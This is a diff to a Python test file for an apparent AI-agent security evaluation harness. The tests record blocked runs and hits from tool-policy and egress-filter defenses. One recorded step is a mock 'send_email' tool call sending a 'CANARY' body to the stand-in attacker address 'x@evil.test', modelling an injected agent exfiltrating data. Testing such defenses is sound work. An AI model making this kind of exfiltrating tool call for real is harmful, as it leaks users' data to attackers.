@@ -37,6 +37,10 @@ def _record(engine, meta, **result):
     return rec.run_id
 
 
+def _hit(defense="d3_tool_policy", action="block"):
+    return {"defense": defense, "stage": "pre_tool_execution", "action": action, "rule": None}
+
+
 @pytest.fixture
 def engine():
     return open_store(":memory:")
@@ -90,7 +94,9 @@ def test_benign_run_without_attack_labels(engine):
 
 def test_model_refusal_kept_separate_from_defense(engine):
     _record(engine, _meta(), outcome="blocked", blocked_by="model_refusal")
-    _record(engine, _meta(), outcome="blocked", blocked_by="defense")
+    with TraceRecorder(engine, _meta()) as rec:
+        rec.step(kind="defense", tool_name="send_email", defense_hits=[_hit()])
+        rec.finish(outcome="blocked", blocked_by="defense")
     counts = export_runs(engine)["blocked_by"].value_counts().to_dict()
     assert counts == {"model_refusal": 1, "defense": 1}
 
@@ -115,10 +121,10 @@ def test_steps_and_totals(engine):
     with TraceRecorder(engine, _meta()) as rec:
         rec.step(kind="llm", tokens_in=100, tokens_out=20, response_model="glm-5.2")
         rec.step(
-            kind="tool",
+            kind="defense",
             tool_name="send_email",
             tool_args={"to": "x@evil.test", "body": "CANARY"},
-            defense_hits=[{"defense": "D4", "reason": "canary"}, {"defense": "D3", "reason": "x"}],
+            defense_hits=[_hit("d4_egress_filter"), _hit("d3_tool_policy")],
         )
         rec.step(kind="llm", tokens_in=50, tokens_out=5)
         rec.finish(outcome="blocked", blocked_by="defense")
@@ -126,8 +132,8 @@ def test_steps_and_totals(engine):
     assert (row["n_steps"], row["tokens_in"], row["tokens_out"]) == (3, 150, 25)
     assert row["response_model"] == "glm-5.2"
     with engine.connect() as conn:
-        hits = conn.execute(text("SELECT defense_hits FROM steps WHERE kind='tool'")).scalar_one()
-    assert '"D4"' in hits and '"D3"' in hits
+        hits = conn.execute(text("SELECT defense_hits FROM steps WHERE kind='defense'")).scalar_one()
+    assert '"d4_egress_filter"' in hits and '"d3_tool_policy"' in hits
 
 
 def test_finish_rejects_unknown_field(engine):
